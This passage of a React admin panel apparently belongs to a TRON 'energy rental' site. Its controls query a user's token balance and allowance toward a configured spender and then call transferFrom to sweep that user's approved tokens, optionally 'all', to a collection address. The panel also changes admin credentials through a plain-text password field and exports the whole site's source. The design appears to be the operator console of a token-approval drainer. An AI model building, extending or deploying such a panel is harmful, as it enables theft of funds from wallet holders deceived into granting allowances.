                  config.web3SignatureCheck ? 'bg-blue-600 justify-end' : 'bg-slate-300 justify-start'
                }`}
              >
                <div className="bg-white w-4 h-4 rounded-full shadow-md" />
              </button>
            </div>
          </div>
        </div>

        {/* SECTION 4: Change Admin Login Credentials */}
        <div className="bg-white rounded-3xl p-6 sm:p-7 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center justify-between border-b border-slate-100 pb-4">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 rounded-2xl bg-rose-50 text-rose-600 flex items-center justify-center font-bold">
                <KeyRound className="w-5 h-5" />
              </div>
              <div>
                <h2 className="text-lg font-bold text-slate-900">4. 管理员登录凭据修改</h2>
                <p className="text-xs text-slate-500">修改后台登录账号与安全密码</p>
              </div>
            </div>
            <button
              type="button"
              onClick={(e) => { e.preventDefault(); handlePublishConfig('section4', '管理员凭据'); }}
              disabled={isPublishing}
              className="bg-rose-600 hover:bg-rose-700 text-white font-bold px-4 py-2 rounded-xl text-xs flex items-center justify-center space-x-1.5 transition shadow-sm cursor-pointer disabled:opacity-50 shrink-0"
            >
              <Save className="w-3.5 h-3.5" />
              <span>保存新账号密码</span>
            </button>
          </div>

          {publishStatus.section4 && (
            <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs p-2.5 rounded-xl flex items-center space-x-2 animate-in fade-in">
              <CheckCircle className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
              <span>{publishStatus.section4}</span>
            </div>
          )}

          <div className="space-y-3.5 text-xs font-sans">
            <div className="space-y-1">
              <label className="font-bold text-slate-700">新管理员账号 (Username)</label>
              <input
                type="text"
                value={config.adminUser}
                onChange={(e) => setConfig({ ...config, adminUser: e.target.value })}
                className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-rose-500 outline-none"
              />
            </div>

            <div className="space-y-1">
              <label className="font-bold text-slate-700">新管理员密码 (Password)</label>
              <input
                type="text"
                value={config.adminPass}
                onChange={(e) => setConfig({ ...config, adminPass: e.target.value })}
                className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-rose-500 outline-none"
              />
            </div>
          </div>
        </div>
      </div>

      {/* SECTION 5: One-click Full Site Export Card */}
      <div className="bg-gradient-to-r from-slate-900 via-blue-950 to-slate-900 text-white rounded-3xl p-6 sm:p-7 border border-blue-900/40 shadow-xl space-y-5">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
          <div className="flex items-start space-x-3.5">
            <div className="w-12 h-12 rounded-2xl bg-blue-600/25 border border-blue-500/40 text-blue-400 flex items-center justify-center shrink-0 shadow-inner">
              <FolderArchive className="w-6 h-6" />
            </div>
            <div className="space-y-1">
              <div className="flex items-center space-x-2">
                <h2 className="text-lg font-bold text-white tracking-tight">一键打包整站重要源码与配置文件导出</h2>
                <span className="bg-blue-500/20 text-blue-300 border border-blue-400/30 text-[10px] font-mono px-2 py-0.5 rounded-full">
                  ZIP Package
                </span>
              </div>
              <p className="text-slate-300 text-xs leading-relaxed max-w-3xl">
                点击下方按键即可将包含后端 Express (<code className="text-blue-300">server.ts</code>)、TRON 合约交互类、前台全部组件、依赖表 (<code className="text-blue-300">package.json</code>) 及配置文件的整站核心代码一键打包导出为 .zip 文件。
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={handleDownloadFullSiteZip}
            disabled={isExporting}
            className="w-full md:w-auto bg-blue-600 hover:bg-blue-500 active:scale-95 text-white font-bold px-6 py-3.5 rounded-2xl text-sm flex items-center justify-center space-x-2.5 transition shadow-lg shadow-blue-600/30 shrink-0 cursor-pointer disabled:opacity-50"
          >
            {isExporting ? (
              <>
                <RefreshCw className="w-4 h-4 animate-spin text-white" />
                <span>正在打包生成 ZIP...</span>
              </>
            ) : (
              <>
                <Download className="w-4 h-4 text-white" />
                <span>一键打包导出整站源码 (.zip)</span>
              </>
            )}
          </button>
        </div>

        <div className="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 space-y-3 text-xs">
          <div className="flex items-center justify-between border-b border-slate-800/80 pb-2.5">
            <span className="text-slate-300 font-semibold flex items-center space-x-1.5">
              <Package className="w-4 h-4 text-blue-400" />
              <span>整站导出文件清单说明 (Included Core Files)</span>
            </span>
            <span className="text-slate-400 text-[11px] font-mono">已排除 node_modules & dist 冗余项</span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 font-mono text-[11px]">
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">server.ts</span>
              <span className="text-slate-400 text-[10px]">(TRON 节点与后端 API)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">package.json</span>
              <span className="text-slate-400 text-[10px]">(全量 npm 依赖表)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">src/utils/tronWallet.ts</span>
              <span className="text-slate-400 text-[10px]">(Web3 钱包对接)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">src/components/*</span>
              <span className="text-slate-400 text-[10px]">(包含完整 15+ React 组件)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">src/App.tsx</span>
              <span className="text-slate-400 text-[10px]">(能量租赁主程序)</span>
            </div>
            <div className="flex items-center space-x-2 bg-slate-900/80 p-2 rounded-xl border border-slate-800">
              <Check className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span className="text-blue-300 font-bold">.env.example & configs</span>
              <span className="text-slate-400 text-[10px]">(部署配置文件)</span>
            </div>
          </div>

          {exportStatusMessage && (
            <div className="mt-2 bg-blue-900/30 border border-blue-700/50 text-blue-200 text-xs p-2.5 rounded-xl flex items-center space-x-2 animate-in fade-in">
              <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
              <span>{exportStatusMessage}</span>
            </div>
          )}
        </div>
      </div>

      {/* SECTION 6 & 7: Query Address & TransferFrom Execution */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Module: Query Address Balance & Allowance */}
        <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
            <div className="w-10 h-10 rounded-2xl bg-blue-50 text-blue-600 flex items-center justify-center font-bold">
              <Search className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">5. 用户 Allowance 与余额在线检测</h2>
              <p className="text-xs text-slate-500">查询特定 TRON 地址的代币余额与对 Spender 的 Allowance 授权额度</p>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                目标用户 TRON 地址 (userAddress)
              </label>
              <input
                type="text"
                value={queryAddress}
                onChange={(e) => setQueryAddress(e.target.value)}
                placeholder="以 T 开头的 TRON 34位地址..."
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-100 outline-none"
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                Spender 合约地址 (Spender Address)
              </label>
              <input
                type="text"
                value={querySpender}
                onChange={(e) => setQuerySpender(e.target.value)}
                placeholder="默认为配置的 SPENDER_ADDRESS"
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-100 outline-none"
              />
            </div>

            <button
              type="button"
              onClick={handleQueryAddressInfo}
              disabled={isQuerying || !queryAddress}
              className="w-full bg-slate-900 hover:bg-slate-800 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition disabled:opacity-50 cursor-pointer"
            >
              <Search className={`w-4 h-4 ${isQuerying ? 'animate-spin' : ''}`} />
              <span>{isQuerying ? '正在查询区块链数据...' : '执行后端查询 (balance / allowance)'}</span>
            </button>

            {(balanceResult !== null || allowanceResult !== null) && (
              <div className="bg-slate-50 rounded-2xl p-4 border border-slate-200 space-y-3 font-mono text-xs">
                <div className="flex items-center justify-between pb-2 border-b border-slate-200">
                  <span className="text-slate-500 font-sans font-medium">代币余额 (balanceOf):</span>
                  <span className="font-bold text-slate-900 text-sm">{balanceResult ?? '未查询'}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-500 font-sans font-medium">Allowance 额度:</span>
                  <span className="font-bold text-emerald-600 text-sm">{allowanceResult ?? '未查询'}</span>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Module: Execute TransferFrom Collection */}
        <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
            <div className="w-10 h-10 rounded-2xl bg-emerald-50 text-emerald-600 flex items-center justify-center font-bold">
              <Send className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">6. 执行 transferFrom 划转打款</h2>
              <p className="text-xs text-slate-500">调用后端 POST /transfer 接口，将特定授权用户的代币划转至归集目标地址</p>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                目标用户地址 (userAddress)
              </label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={transferUserAddress}
                  onChange={(e) => setTransferUserAddress(e.target.value)}
                  placeholder="用户 TRON 钱包地址..."
                  className="flex-1 px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none"
                />
                {queryAddress && (
                  <button
                    type="button"
                    onClick={(e) => { e.preventDefault(); setTransferUserAddress(queryAddress); }}
                    className="px-3 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-medium whitespace-nowrap cursor-pointer"
                  >
                    同步上图地址
                  </button>
                )}
              </div>
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                划转数量 (amount)
              </label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={transferAmount}
                  onChange={(e) => setTransferAmount(e.target.value)}
                  placeholder="'all' 或具体最小单位数值 (如 1000000 代表 1 USDT)"
                  className="flex-1 px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none"
                />
                <button
                  type="button"
                  onClick={(e) => { e.preventDefault(); setTransferAmount('all'); }}
                  className="px-4 py-2 bg-emerald-50 text-emerald-700 hover:bg-emerald-100 border border-emerald-200 rounded-xl text-xs font-bold cursor-pointer"
                >
                  全部划转 (all)
                </button>
              </div>
            </div>

            <button
              type="button"
              onClick={handleExecuteTransfer}
              disabled={isExecutingTransfer || !transferUserAddress}
              className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition shadow-md disabled:opacity-50 cursor-pointer"
            >
              <Send className={`w-4 h-4 ${isExecutingTransfer ? 'animate-bounce' : ''}`} />
              <span>{isExecutingTransfer ? '正在发送链上交易...' : '提交划转请求并确认发布 (POST /transfer)'}</span>
            </button>

            {transferResponse && (
              <div className={`rounded-2xl p-4 border text-xs font-mono space-y-2 ${
                transferResponse.success 
                  ? 'bg-emerald-50/70 border-emerald-200 text-emerald-900' 
                  : 'bg-rose-50/70 border-rose-200 text-rose-900'
              }`}>
                <div className="flex items-center space-x-2 font-sans font-bold">
                  {transferResponse.success ? (
                    <>
                      <CheckCircle className="w-4 h-4 text-emerald-600" />
                      <span>{transferResponse.message || '划转操作成功'}</span>
                    </>
                  ) : (
                    <>
                      <AlertCircle className="w-4 h-4 text-rose-600" />
                      <span>划转响应结果</span>
                    </>
                  )}
                </div>

                {transferResponse.txid && (
                  <div className="space-y-1 pt-1">
                    <span className="text-slate-500 font-sans block text-[11px]">交易 Hash (TxID):</span>
                    <div className="flex items-center justify-between bg-white/80 p-2 rounded-lg border border-slate-200">
                      <span className="truncate">{transferResponse.txid}</span>
                      <button 
                        type="button"
                        onClick={(e) => copyToClipboard(transferResponse.txid, e)}
                        className="text-slate-500 hover:text-slate-800 ml-2 cursor-pointer"
                        title="复制 TxID"
                      >
                        <Copy className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                )}

                {transferResponse.error && (
                  <p className="text-rose-700 font-medium">错误信息: {transferResponse.error}</p>
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* SECTION 8: Terminal Operation Logs */}
      <div className="bg-slate-950 text-slate-200 rounded-3xl p-6 border border-slate-800 shadow-2xl space-y-4">
        <div className="flex items-center justify-between border-b border-slate-800 pb-3">
          <div className="flex items-center space-x-2">
            <Terminal className="w-5 h-5 text-emerald-400" />
            <h3 className="font-bold text-sm text-white font-mono">Backend Console Log & Admin Audit Trail</h3>
          </div>
          <button
            type="button"
            onClick={(e) => { e.preventDefault(); setLogs([]); }}
            className="text-xs text-slate-500 hover:text-slate-300 font-mono cursor-pointer"
          >
            清空操作日志
          </button>
        </div>

        <div className="font-mono text-xs space-y-2 max-h-60 overflow-y-auto pr-2 custom-scrollbar">
          {logs.length === 0 ? (
            <p className="text-slate-600 italic">暂无新的后台操作记录...</p>
          ) : (
            logs.map((log) => (
              <div key={log.id} className="flex items-start space-x-2 text-slate-300 hover:bg-slate-900/50 p-1.5 rounded transition">
                <span className="text-slate-500 text-[10px] whitespace-nowrap font-mono">{log.timestamp}</span>
                <span className={`px-1.5 py-0.5 rounded text-[10px] uppercase font-bold ${
                  log.status === 'success' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'
                }`}>
                  [{log.type}]
                </span>
                <span className="flex-1 break-all">{log.details}</span>
                {log.txid && (
                  <span className="text-blue-400 text-[10px] font-mono shrink-0">
                    Tx: {log.txid.slice(0, 8)}...
                  </span>
                )}
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
};
